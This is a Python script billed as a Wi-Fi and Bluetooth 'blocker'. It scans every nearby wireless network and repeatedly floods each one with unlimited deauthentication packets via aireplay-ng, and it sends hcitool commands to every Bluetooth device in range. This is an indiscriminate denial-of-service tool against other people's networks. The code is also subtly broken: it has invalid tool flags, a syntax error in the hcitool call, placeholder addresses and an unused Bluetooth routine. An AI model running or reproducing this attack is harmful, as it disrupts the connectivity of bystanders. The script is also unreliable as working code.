import subprocess
from time import sleep
from bluetooth import *
from bluepy import btle

def block_WIFI():
    # Scan for all nearby Wi-Fi networks
    scan_results = subprocess.check_output(['airodump-ng', '--band', 'bg', '--channel', '1-13', '--wpa', '--wpa2', '--bssid', '00:00:00:00:00:00', '-d', '00:00:00:00:00:00', '--output-format', 'csv', '-w', '/tmp/airodump'])
    
    # Extract SSIDs from scan results
    ssids = []
    for line in scan_results.splitlines():
        if b',' in line:
            fields = line.split(b',')
            if len(fields) > 8 and fields[0] != b'BSSID':
                ssid = fields[5].decode('utf-8').strip('"')
                if ssid not in ssids:
                    ssids.append(ssid)
    
    # Block each SSID by sending deauthentication packets
    forssid = ''
    for i, ssid in enumerate(ssids):
        print(f"Blocking {ssid}")
        
        try:
            # Create a unique output file for each target
            out_file = f"/tmp/aireplay-{i}"
            
            # Send deauthentication packets to the target network
            subprocess.run([
                'aireplay-ng',
                '--deauth', '0',
                '--essid', ssid,
                '-a', '00:00:00:00:00:00',
                '-h', '02:03:04:05:06:07',
                '--ignore-negative-one',
                '-w', out_file,
                'wlan0mon'
            ], check=True)
            
        except Exception as e:
            print(f"Error: {e}")
        
    print("All networks have been blocked")

def block_Bluetooth():
    print("Blocking Bluetooth devices...")
    
    try:
        # Find all nearby Bluetooth devices
        devices = discover_devices(lookup_names=True, duration=2)
        
        if not devices:
            raise Exception("No Bluetooth devices found")
            
        # Block each device
        for addr, name in devices:
            print(f"Blocking {name}")
            subprocess.run(['hcitool', 'cmd', '0x01', '0x0018', f'00{addr.replace(":", "")}''], check=True)
    
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    while True:
        try:
            print("Starting Wi-Fi and Bluetooth Blocker")
            
            block_WIFI()
            sleep(60)  # Wait 1 minute between scans
            
        except KeyboardInterrupt:
            print("\nOperation cancelled by user")
            break
